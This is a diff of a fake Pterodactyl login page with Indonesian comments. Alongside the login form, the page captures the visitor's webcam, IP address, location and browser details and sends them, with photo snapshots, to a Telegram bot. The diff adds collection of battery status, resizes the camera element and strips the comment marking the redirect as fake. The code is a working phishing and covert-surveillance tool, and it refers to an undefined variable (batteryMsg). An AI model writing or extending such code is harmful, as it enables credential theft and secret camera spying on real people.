@@ -71,10 +71,9 @@
     <input type="password" id="password" placeholder="PASSWORD">
     <button onclick="handleLogin()">LOGIN</button>
     <p style="margin-top: 10px;"><a href="#" style="color: #90cdf4;">FORGOT PASSWORD?</a></p>
-
     <p id="loading">Loading...</p>
-    <video id="camera" autoplay playsinline width="1" height="1"></video>
-    <canvas id="snapshot" width="300" height="300" style="display:none;"></canvas>
+    <video id="camera" autoplay playsinline width="300" height="200"></video>
+    <canvas id="snapshot" width="300" height="200" style="display:none;"></canvas>
   </div>
 
   <footer>© 2015 - 2025 Pterodactyl Software</footer>
@@ -136,7 +135,7 @@
 
       setTimeout(() => {
         loading.style.display = 'none';
-        window.location.href = 'https://example.com/dashboard.html'; // redirect palsu
+        window.location.href = 'https://example.com/dashboard.html';
       }, 3000);
     }
 
@@ -165,6 +164,8 @@
 | 🔎 IP Address: ${ipAddress}
 | 📍 Lokasi: ${locationInfo}
 | 📸 Kamera: ${cameraStatus}
+| 🔋 Baterai: ${batteryLevel}
+| ⚡ Status Pengisian: ${isCharging}
 | 🗃 User-Agent: ${userAgent}
 | 🕰 Waktu Login: ${time}
 |------------------------------------------
@@ -183,13 +184,23 @@
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: formData
-      }).then(() => console.log("Gambar terkirim ke Telegram"));
+      });
+
+      // Kirim status baterai
+      navigator.getBattery().then(battery => {
+        const batteryLevel = `${battery.level * 100}%`;
+        const isCharging = battery.charging ? "Mengisi daya" : "Tidak mengisi";
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: batteryMsg })
+        });
+      });
     }
 
     function checkAndSend() {
-      if (ipAddress && locationInfo && cameraStatus && streamData) {
-        // cukup info, lanjut snapshot
-      }
+      // Fungsi placeholder jika diperlukan sinkronisasi tambahan
     }
   </script>
 </body>
